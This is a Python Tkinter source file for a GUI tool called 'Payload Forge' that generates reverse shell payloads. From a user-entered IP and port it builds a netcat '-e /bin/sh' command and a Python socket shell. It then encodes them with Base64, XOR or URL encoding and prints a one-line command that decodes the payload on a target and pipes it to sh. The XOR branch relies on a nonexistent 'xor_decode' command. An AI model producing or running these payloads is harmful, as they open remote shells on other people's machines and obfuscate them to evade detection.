import tkinter as tk
import base64
import urllib.parse

def generate_payload():
    # Get user inputs
    shell_choice = shell_var.get()
    encoding_choice = encoding_var.get()
    ip = ip_entry.get()
    port = port_entry.get()

    # Generate payload based on user choices
    payload = ""
    if shell_choice == "Netcat":
        payload = f"nc -e /bin/sh {ip} {port}"
    elif shell_choice == "Python":
        payload = f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])'"

    # Encode payload if selected
    encoded_payload = payload
    if encoding_choice == "Base64":
        encoded_payload = base64.b64encode(payload.encode()).decode()
        decoded_command = f"echo {encoded_payload} | base64 -d | sh"
    elif encoding_choice == "XOR":
        # Implement XOR encoding (customize as needed)
        encoded_payload = xor_encode(payload)
        decoded_command = f"echo {encoded_payload} | xor_decode | sh"
    elif encoding_choice == "URL Encoding":
        encoded_payload = urllib.parse.quote_plus(payload)
        decoded_command = f"echo {encoded_payload} | sed 's/+/ /g;s/%/\\\\x/g' | xargs -0 printf | sh"
    else:
        decoded_command = f"echo {payload} | sh"

    # Display generated payload, encoded payload, and command in the GUI
    output_text.delete(1.0, tk.END)
    output_text.insert(tk.END, f"Plain Text Payload:\n{payload}\n\nEncoded Payload:\n{encoded_payload}\n\nCommand to decode and run on target:\n{decoded_command}")

def xor_encode(payload):
    # Example XOR encoding function (customize as needed)
    key = 0xAB  # Example XOR key (change as desired)
    encoded_payload = ''.join([chr(ord(c) ^ key) for c in payload])
    return encoded_payload

# Create GUI
root = tk.Tk()
root.title("Payload Forge")
root.geometry("470x300")

# Shell choices
shell_var = tk.StringVar()
shell_var.set("Netcat")
shell_label = tk.Label(root, text="Select Shell:")
shell_label.grid(row=0, column=0)
shell_choices = ["Netcat", "Python"]
for i, choice in enumerate(shell_choices):
    rb = tk.Radiobutton(root, text=choice, variable=shell_var, value=choice)
    rb.grid(row=0, column=i+1)

# Encoding choices
encoding_var = tk.StringVar()
encoding_var.set("Base64")
encoding_label = tk.Label(root, text="Select Encoding:")
encoding_label.grid(row=1, column=0)
encoding_choices = ["Base64", "XOR", "URL Encoding", "None"]
for i, choice in enumerate(encoding_choices):
    rb = tk.Radiobutton(root, text=choice, variable=encoding_var, value=choice)
    rb.grid(row=1, column=i+1)

# IP and Port entries
ip_label = tk.Label(root, text="Enter IP:")
ip_label.grid(row=2, column=0)
ip_entry = tk.Entry(root)
ip_entry.grid(row=2, column=1)
port_label = tk.Label(root, text="Enter Port:")
port_label.grid(row=2, column=2)
port_entry = tk.Entry(root)
port_entry.grid(row=2, column=3)

# Generate button
generate_button = tk.Button(root, text="Generate Payload", command=generate_payload)
generate_button.grid(row=3, columnspan=5)

# Output text area
output_text = tk.Text(root, height=10, width=50)
output_text.grid(row=4, columnspan=5)

root.mainloop()
